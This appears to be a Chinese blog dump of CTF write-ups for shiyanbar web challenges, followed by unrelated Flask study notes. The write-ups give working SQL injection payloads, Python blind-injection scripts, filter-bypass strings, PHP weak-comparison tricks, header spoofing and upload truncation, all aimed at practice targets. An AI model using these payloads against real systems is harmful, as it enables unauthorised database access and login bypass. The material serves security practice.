1?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/ttable_schemaable_schema=%27web1 爆列payload: 1?id=0%27/**/union/**/select/**/ccolumn_nameolumn_name/**/from/**/infinformation_schema.columnsormation_schema.columns/**/where/**/table_name=%27flag 爆数据payload: 1?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/where/**/%271 简单的sql注入之2网址：http://ctf5.shiyanbar.com/web/index_2.php 同样注入点是id，数字型注入，过滤了空格，用行注释符代替即可 爆库payload: 1?id=0%27/**/union/**/select/**/database()/**/%23 爆表payload: 1?id=0%27/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=%27web1 爆列payload: 1?id=0%27/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=%27flag 爆数据payload: 1?id=0%27/**/union/**/select/**/flag/**/from/**/flag/**/%23 简单的sql注入之3网址：http://ctf5.shiyanbar.com/web/index_3.php 有查询结果返回hello，无结果则不返回，有报错信息，但是过滤了extractvalue和updatexml，所以选择用基于布尔的盲注 python脚本如下： 123456789101112131415161718192021222324252627282930313233343536import requestsall_string = '''qwertyuiopasdfghjklzxcvbnm&#123;&#125;QWERTYUIOPASDFGHJKLZXCVBNM@_1234567890 '''database = \"\"#数据库名:web1'''for i in range(1,100): for j in all_string: f = 0 print('checking '+j) url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select database()),%s,1))=%s--+\"%(str(i),ord(j)) r = requests.get(url) if \"Hello!\" in r.text: print('The '+str(i)+' place of database is: '+j) database = database + j f = 1 break if f == 0 and j == '?': breakprint('database: '+database)'''#flag:flag = \"\"for i in range(1,100): for j in all_string: f = 0 print('checking '+j) url = \"http://ctf5.shiyanbar.com/web/index_3.php?id=1' and ascii(substr((select flag from flag),%s,1))=%s--+\"%(str(i),ord(j)) r = requests.get(url) if \"Hello!\" in r.text: print('The '+str(i)+' place of flag is: '+j) flag = flag + j f = 1 break if f == 0 and j == ' ': break 因缺思汀的绕过网址：http://ctf5.shiyanbar.com/web/pcat/index.php 源代码给出了提示：source.txt 访问得到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123; echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123; print &quot;姘村彲杞借垷锛屼害鍙禌鑹囷紒&quot;; exit(); &#125;&#125;$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)&quot;;foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);if (!$con)&#123; die(&apos;Could not connect: &apos; . mysql_error());&#125;$db=&quot;XXXXXX&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123; print &quot;CTF&#123;XXXXXX&#125;&quot;; &#125;else&#123; print &quot;浜﹀彲璧涜墖锛�&quot;; &#125;&#125;else&#123; print &quot;涓€棰楄禌鑹囷紒&quot;;&#125;mysql_close($con);?&gt; 审计代码，得到flag的思路： 1.需要POST两个参数uname和pwd 2.经过sql查询后返回的结果行数必须为1 3.查询结果的pwd字段必须等于我们POST的参数pwd值 这里过滤了关键字and，select，from，where，union，join，sleep，benchmark，(，)，逗号 我们必须控制查询结果的pwd字段，而这里union被过滤了，基于布尔的盲注也不行 解决方法是用with rollup，它的作用是在查询结果的最后一行添加null，但是必须配合group by来使用 在本地数据库测试： 所以我们可以通过group by pwd with rollup来返回一行查询结果，其中pwd列下的数据为NULL，然后POST的参数pwd赋值为空，就可以控制两个参数相等 那么我们接下来就是控制查询行数为1 通过limit 1来控制查询行数为1，但是还要返回NULL的那行，这里逗号被过滤了，可以使用 limit 1 offset 0 ，效果跟limit 0,1是一样的 所以最终的payload: 1uname=&apos; or 1 group by pwd with rollup limit 1 offset 2#&amp;pwd= 天下武功唯快不破网址：http://ctf5.shiyanbar.com/web/10/10.php burp抓包发现响应头部存在FLAG字段 FLAG字段经过BASE64加密 解密后post参数key等于解密后的值 没有得到flag，发现头部FLAG字段值又发生了变化，想起题目可能要快速提交flag，可能要写脚本提交key 脚本如下： 123456789101112131415import requestsimport base64url = \"http://ctf5.shiyanbar.com/web/10/10.php\"s = requests.Session()r = s.get(url)FLAG = base64.b64decode(r.headers['FLAG'])FLAG = bytes.decode(FLAG)FLAG = FLAG.split(':')[1]data = &#123; 'key':FLAG &#125;r = requests.post(url,data=data)print(r.text) 运行结果：CTF{Y0U_4R3_1NCR3D1BL3_F4ST!} 拐弯抹角网址：http://ctf5.shiyanbar.com/indirection/index.php 给出了源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;?php // code by SEC@USTC echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;; $URL = $_SERVER[&apos;REQUEST_URI&apos;]; //echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;; $flag = &quot;CTF&#123;???&#125;&quot;; $code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;)); $stop = 0; //这道题目本身也有教学的目的 //第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 //所以，第一个要求就是不得出现 ./ if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 1; //Pass &#125; //第二，我们可以构造 \\ 来代替被过滤的 / //所以，第二个要求就是不得出现 ../ if($flag &amp;&amp; strpos($URL, &apos;\\\\&apos;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 2; //Pass &#125; //第三，有的系统大小写通用，例如 indirectioN/ //你也可以用?和#等等的字符绕过，这需要统一解决 //所以，第三个要求对可以用的字符做了限制，a-z / 和 . $matches = array(); preg_match(&apos;/^([0-9a-z\\/.]+)$/&apos;, $URL, $matches); if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123; $flag = &quot;&quot;; $stop = 3; //Pass &#125; //第四，多个 / 也是可以的 //所以，第四个要求是不得出现 // if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 4; //Pass &#125; //第五，显然加上index.php或者减去index.php都是可以的 //所以我们下一个要求就是必须包含/index.php，并且以此结尾 if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123; $flag = &quot;&quot;; $stop = 5; //Pass &#125; //第六，我们知道在index.php后面加.也是可以的 //所以我们禁止p后面出现.这个符号 if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123; $flag = &quot;&quot;; $stop = 6; //Pass &#125; //第七，现在是最关键的时刻 //你的$URL必须与/indirection/index.php有所不同 if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123; $flag = &quot;&quot;; $stop = 7; //Pass &#125; if(!$stop) $stop = 8; echo &apos;Flag: &apos;.$flag; echo &apos;&lt;hr /&gt;&apos;; for($i = 1; $i &lt; $stop; $i++) $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code); for(; $i &lt; 8; $i++) $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code); echo highlight_string($code, TRUE); echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;; 绕过思路源代码都给出了提示，考察的是url伪静态，比如url中含有xxxx.php/xx/x，那么.php后的xx就会被当成参数名，x会被当成参数 所以可以构造payload:http://ctf5.shiyanbar.com/indirection/index.php/a/index.php Forms网址：http://ctf5.shiyanbar.com/10/main.php burp抓包试着修改showsouce参数=1 提示了源代码 123456$a = $_POST[&quot;PIN&quot;];if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo &quot;Congratulations! The flag is $flag&quot;;&#125; else &#123; echo &quot;User with provided PIN not found.&quot;; &#125; POST参数PIN等于-19827747736161128312837161661727773716166727272616149001823847 拿到flag 天网管理系统网址：http://ctf5.shiyanbar.com/10/web1/index.php 首先源代码给出了提示 1&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt; 这里应该是POST参数username，然后加密后的值 == ‘0’ 这里涉及PHP的弱类型比较，== 比较时，PHP会将数字字符串的数字值取出进行比较，例如’0’ == ‘0abc’ 所以我们只需要找到一个md5加密后的值0开头的字符串即可，典型的为240610708 和 QNKCDZO POST参数username=240610708得到/user.php?fame=hjkleffifer 访问后又得到一串代码： 12345678$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125;伟大的科学家php方言道：成也布尔，败也布尔。回去吧骚年 审计后发现需要POST一个序列化后的值，使得反序列化后的数组user键的值和pass键的值 == 未知字符串，题目还给出了提示“成也布尔，败也布尔”，这里又需要利用PHP弱类型比较，当布尔类型的true与任何字符串弱类型相等 本地测试得到序列化后的值 1234567&lt;?php$data_unserialize = array('user' =&gt; True,'pass' =&gt; True);$unserialize_str = serialize($data_unserialize);echo $unserialize_str;?&gt; 执行结果 a:2:{s:4:”user”;b:1;s:4:”pass”;b:1;} POST后得到flag 忘记密码了网址：http://ctf5.shiyanbar.com/10/upload/step1.php 一个找回密码的页面，试着源代码看不出提示信息，试着注册一个email 弹框提示了./step2.php?email=youmail@mail.com&amp;check=??????? 访问step2.php的源代码，发现 12&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; / 12345678910&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt; &lt;h1&gt;找回密码step2&lt;/h1&gt; email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; &lt;br /&gt;&lt;b&gt;Notice&lt;/b&gt;: Use of undefined constant email - assumed &apos;email&apos; in &lt;b&gt;C:\\h43a1W3\\phpstudy\\WWW\\10\\upload\\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Notice&lt;/b&gt;: Undefined index: email in &lt;b&gt;C:\\h43a1W3\\phpstudy\\WWW\\10\\upload\\step2.php&lt;/b&gt; on line &lt;b&gt;49&lt;/b&gt;&lt;br /&gt;value=&quot;&quot; disable=&quot;true&quot;/&gt;&lt;/br&gt; token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 发现这个页面会GET两个参数emailAddress和token到submit.php 访问submit.php，提示you are not an admin 在step2.php中我们还发现了该页面可能是通过vim编写的，所以可能存在.submit.php.swp 访问后得到提示代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243........这一行是省略的代码......../*如果登录邮箱地址不是管理员则 die()数据库结构---- 表的结构 `user`--CREATE TABLE IF NOT EXISTS `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) NOT NULL, `email` varchar(255) NOT NULL, `token` int(255) NOT NULL DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;---- 转存表中的数据 `user`--INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES(1, '****不可见***', '***不可见***', 0);*/........这一行是省略的代码........if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo \"失败了呀\"; &#125;&#125; 审计后的思路 1.需要GET参数token和emailAddress 2.token值长度为10且必须弱类型等于0 3.sql语句有查询结果 首先弱类型相等，且长度为10，那么token可以赋值’0000000000’ 然后emailAddress猜测是在step2.php中的admin@simplexue.com 得出payload:emailAddress=admin@simplexue.com&amp;token=0000000000 得到flag Once More网址：http://ctf5.shiyanbar.com/web/more.php 源代码： 1234567891011121314151617181920212223&lt;?phpif (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '*-*') !== FALSE) &#123; die('Flag: ' . $flag); &#125; else &#123; echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); &#125; &#125; else &#123; echo '&lt;p&gt;Invalid password&lt;/p&gt;'; &#125;&#125;?&gt; 审计源代码，获得flag需要绕过3个检测： 1.符合ereg正则匹配，用%00绕过即可 2.password长度小于8但是值大于9999999，用科学计数法即可绕过 3.12最后payload: password=1e8%00-12345678910111213141516171819### Guess Next Session网址：http://ctf5.shiyanbar.com/web/Session.php源代码：```php&lt;?phpsession_start(); if (isset ($_GET[&apos;password&apos;])) &#123; if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;]) die (&apos;Flag: &apos;.$flag); else print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 审计得flag思路：GET的参数password必须等于SESSION[‘password’]，我们知道session是存储在服务器上，但是在本地存在一个cookie字段：session_id 我们可以将cookie字段的session_id删除，然后get的参数password为空，即可让二者相等 FALSE网址：http://ctf5.shiyanbar.com/web/false.php 源代码： 123456789101112&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt; 得到flag思路：GET的参数name和password不相等但是sha1加密后相等 查询得知sha1函数只能处理字符串类型，处理数组则返回FALSE，那么可以构造payload: name[]=a&amp;password[]=b a和b只要不相等就能得到flag 上传绕过网址：http://ctf5.shiyanbar.com/web/upload/ bp截取包修改文件类型无效，修改为png文件提示必须上传php文件 尝试0x00截断 在上传路径/uploads/下添加demo.php+ 并将+在十六进制中的2b替换成00 获取flag NSCTF web200网址：http://ctf5.shiyanbar.com/web/web200.jpg 给出加密函数，要求我们编写解密函数 代码如下： 123456789101112131415161718&lt;?phpfunction decode($key)&#123; $_ = base64_decode(strrev(str_rot13($key))); $_o = &apos;&apos;; for($_0=0;$_0&lt;strlen($_);$_0++)&#123; $c = substr($_,$_0,1); $__ = chr(ord($c)-1); $_o = $_o.$__; &#125; $str = strrev($_o); return $str;&#125;$key = &apos;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&apos;;echo decode($key);?&gt; 运行结果：flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977} 程序逻辑问题网址：http://ctf5.shiyanbar.com/web/5/index.php 源代码提示文件index.txt，访问得源代码： 1234567891011121314151617181920212223242526272829&lt;?phpif($_POST[&apos;user&apos;] &amp;&amp; $_POST[&apos;pass&apos;]) &#123; $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error)&#123; die(&quot;Connection failed: &quot; . mysql_error($conn)); &#125; $user = $_POST[&apos;user&apos;]; $pass = md5($_POST[&apos;pass&apos;]); $sql = &quot;select pw from php where user=&apos;$user&apos;&quot;; $query = mysql_query($sql); if (!$query) &#123; printf(&quot;Error: %s\\n&quot;, mysql_error($conn)); exit(); &#125; $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125; &#125;?&gt; 对参数$user不存在过滤，可以进行sql注入，进而控制查询结果的pw列的数据 因为$pass是我们POST的参数pass经过md5加密后得到的值 所以构造payload: 1user=&apos; union select md5(&apos;1&apos;)#&amp;pass=1 得到flag:SimCTF{youhaocongming} what a fuck!这是什么鬼东西?网址：http://ctf5.shiyanbar.com/DUTCTF/1.html 页面显示一段jsfuck代码 直接放到浏览器控制台运行 弹出密码：Ihatejs 尝试即为flag PHP大法网址：http://ctf5.shiyanbar.com/DUTCTF/index.php 源代码给出提示文件index.php.txt 访问得源代码： 12345678910111213&lt;?phpif(eregi(\"hackerDJ\",$_GET[id])) &#123; echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"hackerDJ\")&#123; echo \"&lt;p&gt;Access granted!&lt;/p&gt;\"; echo \"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;\";&#125;?&gt; 考察url二次编码，将hackerDJ进行二次url编码后作为参数id值，浏览器首先会对id值进行一次url解码，之后绕过eregi检测后再对一次解码后的值进行二次解码，解码后得hackerDJ payload: 1?id=%2568%2561%2563%256b%2565%2572%2544%254a 这个看起来有点简单!网址：http://ctf5.shiyanbar.com/8/index.php 输入1’,1”都报错，输入1%23返回正确信息 说明id未被引号包裹 进行sql注入： 注数据库payload: 1?id=0%20union%20select%201,database()%23 数据库名：my_db 注数据表payload: 1?id=0%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23 数据表名：news,thiskey 注数据列payload: 1?id=0%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27thiskey%27%23 列名：k0y 注数据payload: 1?id=0%20union%20select%201,k0y%20from%20thiskey%23 flag: whatiMyD91dump 貌似有点难网址：http://ctf5.shiyanbar.com/phpaudit/ 源代码： 123456789101112131415161718192021&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])) $cip = $_SERVER[\"HTTP_CLIENT_IP\"];else if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"])) $cip = $_SERVER[\"HTTP_X_FORWARDED_FOR\"];else if(!empty($_SERVER[\"REMOTE_ADDR\"])) $cip = $_SERVER[\"REMOTE_ADDR\"];else $cip = \"0.0.0.0\";return $cip;&#125;$GetIPs = GetIP();if ($GetIPs==\"1.1.1.1\")&#123;echo \"Great! Key is *********\";&#125;else&#123;echo \"错误！你的IP不在访问列表之内！\";&#125;?&gt; burp抓包添加X-Forwarded-For:1.1.1.1即可获得flag:SimCTF{daima_shengji} 头有点大网址：http://ctf5.shiyanbar.com/sHeader/ 页面给了提示http header Please make sure you have installed .net framework 9.9! Make sure you are in the region of England and browsing this site with Internet Explorer 思路就是修改http请求头部的User-Agent字段和Accept-Language字段 第一个是安装.net9.9框架 第二个是保证在英国地区 第三个是用ie浏览器 第一个和第三个我们可以在User-Agent后加上(MSIE 9.0;.NET CLR 9.9)来实现 最后一个在英国我们把语言改成en-gb即可 猫抓老鼠网址：http://ctf5.shiyanbar.com/basic/catch/ 提示catch，bp抓包发现响应头部字段Content-Row: MTUzNzAzMDU2OA== 经过base64解密后1537030568 作为pass_key提交无果，直接提交pass_key=MTUzNzAzMDU2OA==得到flag KEY: #WWWnsf0cus_NET# 看起来有点难网址：http://ctf5.shiyanbar.com/basic/inject/index.php 注入点在admin,使用基于时间的盲注，脚本略","categories":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"Python-flask","slug":"python-flask学习笔记","date":"2018-09-08T06:06:00.000Z","updated":"2018-09-19T11:22:39.688Z","comments":true,"path":"/posts/11047/","link":"","permalink":"https://Foxgrin.github.io/posts/11047/","excerpt":"Python-flask学习笔记","text":"Python-flask学习笔记 Python虚拟环境安装1pip install virtualenv Python激活虚拟环境1virtualenv [virtualenv-name] 1activate pip安装flask1pip install flask 使用pycharm创建新项目 程序基本结构初始化Flask对象传递一个参数123456781.方便flask框架去寻找资源2.方便flask插件比如Flask-Sqlalchemy出现错误时候好去寻找问题所在```pythonfrom flask import Flaskapp = Flask(__name__) 创建路由与视图函数123@app.route('/')def hello_world(): return 'Hello World!' @app.route是一个装饰器，以@开头，并且在函数的上面，说明是装饰器 这个装饰器的作用，是做一个url与视图函数的映射，处理函数与url之间的映射成为路由 127.0.0.1:5000/ -&gt; 去请求hello_world这个视图函数，然后将结果返回给服务器 启动服务器12if __name__ == '__main__': app.run() app.run()作用是启动一个应用服务器，来接受用户的请求 完整程序12345678910from flask import Flaskapp = Flask(__name__)@app.route('/')def hello_world(): return 'Hello World!'if __name__ == '__main__': app.run() 设置debug模式1.在app.run()中传入一个关键字参数debug,app.run(debug=True)，就设置当前项目为debug模式 2.debug模式的两大功能： (1)当程序出现问题的时候，可以在页面中看到错误信息和出错的位置。 (2)只要修改了项目中的python文件，程序会自动加载，不需要手动重新启动服务器 url传参数1.参数的作用：可以在相同的URL,但是指定不同的参数，来加载不同的数据 2.在flask中使用参数 123@app.route('/article/&lt;id&gt;')def article(id): return u'您请求的参数是: %s '%id 参数需要放在两个尖括号中 视图函数中需要放和url中的参数同名的参数 反转url1.什么叫做反转URL：从视图函数到url的转换叫做反转url 2.反转url的用处： (1)在页面重定向的时候，会使用url反转 (2)在模板中，也会使用url反转 3.例子 12345678910111213141516171819202122#encoding: utf-8from flask import Flask,url_forapp = Flask(__name__)@app.route('/')def hello_world(): print url_for('my_list') print url_for('article',id=1000) return 'Hello'@app.route('/list/')def my_list(): return 'list'@app.route('/article/&lt;id&gt;')def article(id): return u'您请求的参数是: %s '%idif __name__ == '__main__': app.run(debug=True) 页面跳转和重定向1.用处：在用户访问一些需要登录的页面的时候，如果用户没有登录，那么可以让他重定向到登录页面 2.代码实现： 12from flask import redirect,url_forredirect(url_for('login')) 3.例子： 123456789101112131415161718#encoding: utf-8from flask import Flask,redirect,url_forapp = Flask(__name__)@app.route('/')def index(): login_url = url_for('login') return redirect(login_url) return u'这是首页'@app.route('/login/')def login(): return u'这是登录页面'if __name__ == '__main__': app.run(debug=True) 访问127.0.0.1:5000/自动跳转到127.0.0.1:5000/login/ 12345678910111213141516171819202122232425#encoding: utf-8from flask import Flask,redirect,url_forapp = Flask(__name__)@app.route('/')def index(): login_url = url_for('login') return redirect(login_url) return u'这是首页'@app.route('/login/')def login(): return u'这是登录页面'@app.route('/question/&lt;is_login&gt;')def question(is_login): if is_login == '1': return u'这是发布问答的页面' else: return redirect(url_for('login'))if __name__ == '__main__': app.run(debug=True) 如果我们访问127.0.0.1:5000/question/0则自动重定向到登录页面 Flask渲染jinja2模板和传参渲染模板1.模板放在templates文件夹下 2.从flask中导入render_template函数 3.在视图函数中，使用render_template函数，渲染模板。注意：只需要填写模板的名字，不需要填写templates文件夹 模板传参1.如果只有一个或者少量参数，直接在render_template函数中添加关键字就可以了 2.如果有多个参数的时候，那么可以先把所有的参数放在字典中，然后在render_template中，使用两个星号，把字典转换成关键参数传递进去，这样代码更方便管理和使用 3.在模板中，如果要使用一个变量，语法是： 例子： index.html中内容 渲染模板代码： 1234567891011121314151617#encoding: utf-8from flask import Flask,render_templateapp = Flask(__name__)@app.route('/')def index(): context = &#123; 'username':u'知了课堂', 'gender':u'男', 'age':18 &#125; return render_template('index.html',**context)if __name__ == '__main__': app.run(debug=True) 模板中访问属性和字典访问模型中的属性或者是字典，可以通过的形式，或者是使用 例子： index.html 123456789101112这是HTML文件中出现的文字&lt;p&gt;用户名:&#123;&#123; username &#125;&#125;&lt;/p&gt;&lt;p&gt;性别：&#123;&#123; gender &#125;&#125;&lt;/p&gt;&lt;p&gt;年龄：&#123;&#123; age &#125;&#125;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;名字：&#123;&#123; person.name &#125;&#125;&lt;/p&gt;&lt;p&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;百度：&#123;&#123; websites.baidu &#125;&#125;&lt;/p&gt;&lt;p&gt;谷歌：&#123;&#123; websites.google &#125;&#125;&lt;/p&gt; python代码： 12345678910111213141516171819202122232425262728#encoding: utf-8from flask import Flask,render_templateapp = Flask(__name__)@app.route('/')def index(): class Person(object): name = 'Stuxnet8' age = 18 p = Person() context = &#123; 'username':'Stuxnet8', 'gender':u'男', 'age':18, 'person':p, 'websites':&#123; 'baidu':'www.baidu.com', 'google':'www.google.com' &#125; &#125; return render_template('index.html',**context)if __name__ == '__main__': app.run(debug=True) 执行结果： if判断1.语法： 123&#123;% if 判断条件 %&#125;&#123;% else %&#125;&#123;% endif %&#125; 2.if的使用，可以和python中相差无几 3.例子 if.html 1234567&#123;% if user %&#125; &lt;a href=&quot;#&quot;&gt;&#123;&#123; user.username &#125;&#125;&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;注销&lt;/a&gt;&#123;% else %&#125; &lt;a href=&quot;#&quot;&gt;登录&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;注册&lt;/a&gt;&#123;% endif %&#125; python代码 12345678910111213141516171819#encoding: utf-8from flask import Flask,render_templateapp = Flask(__name__)@app.route('/&lt;is_login&gt;/')def index(is_login): if is_login == '1': user = &#123; 'username':'Stuxnet8', 'age':18 &#125; return render_template('if.html',user=user) else: return render_template('if.html')if __name__ == '__main__': app.run(debug=True) for循环遍历列表和字典1.字典的遍历，语法和python一样，可以使用items(),keys(),values(),iteritems(),iterkeys(),itervalues() 123&#123;% for k,v in user.items() %&#125; &lt;p&gt;&#123;&#123; k &#125;&#125;:&#123;&#123; v &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 2.例子 for.html 123&#123;% for k,v in user.items() %&#125; &lt;p&gt;&#123;&#123; k &#125;&#125;:&#123;&#123; v &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; python代码 12345678910111213#encoding: utf-8from flask import Flask,render_templateapp = Flask(__name__)@app.route('/')def index(): user = &#123; 'username':'Stuxnet8', 'age':18 &#125; return render_template('for.html',user=user) 执行结果： 3.列表的遍历：语法和python一样 123&#123;% for list in lists %&#125; &lt;p&gt;&#123;&#123; website &#125;&#125;&lt;/p&gt;&#123;% endfor %&#125; 过滤器1.介绍和语法： (1)介绍：过滤器可以处理变量，把原始的变量经过处理后再展示出来 (2)语法： 1&#123;&#123; avatar|default(&apos;xxx&apos;) &#125;&#125; 2.default过滤器：如果当前变量不存在，这时候可以指定默认值 3.length过滤器：求列表或者字符串或者字典或者元组的长度 继承和block1.继承的作用和语法： (1)作用：可以把一些公共的代码放在父模板中，避免每个模板写同样的代码 (2)语法： 1&#123;% extends &apos;base.html&apos; %&#125; 2.block实现： (1)作用：可以让子模板实现自己的一些需求，父模板需要提前定义好 (2)注意点：子模板中的代码，必须放在block块中 3.例子 模板base.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;这是一个模板&#123;% block main %&#125;&#123;% endblock %&#125;&lt;/body&gt;&lt;/html&gt; 继承block.html 1234&#123;% extends 'base.html' %&#125;&#123;% block main %&#125; 这是一个子模板&#123;% endblock %&#125; url链接使用url_for(视图函数名称)可以反转成url 加载静态文件1.语法： 1url_for(&apos;static&apos;,filename=&apos;路径&apos;) 2.静态文件，flask会从static文件夹开始寻找，所以不用再写static这个路径 3.可以加载css文件，可以加载js文件，还有image文件 Mysql-python中间件安装https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python flask-sqlalchemy安装与使用1.安装 1pip install flask-sqlalchemy 2.使用 (1)使用flask_sqlalchemy中的SQLAlchemy进行初始化： 123from flask_sqlalchemy import SQLAlchemyapp = Flask(__name__)db = SQLAlchemy(app) (2)设置配置信息：在config.py文件中添加以下配置信息： 1234567891011# dialect+driver://username:password@host:port/databaseDIALECT = 'mysql'DRIVER = 'mysqldb'USERNAME = 'root'PASSWORD = 'root'HOST = '127.0.0.1'PORT = '3306'DATABASE = 'db_demo1'SQLALCHEMY_DATABASE_URI = 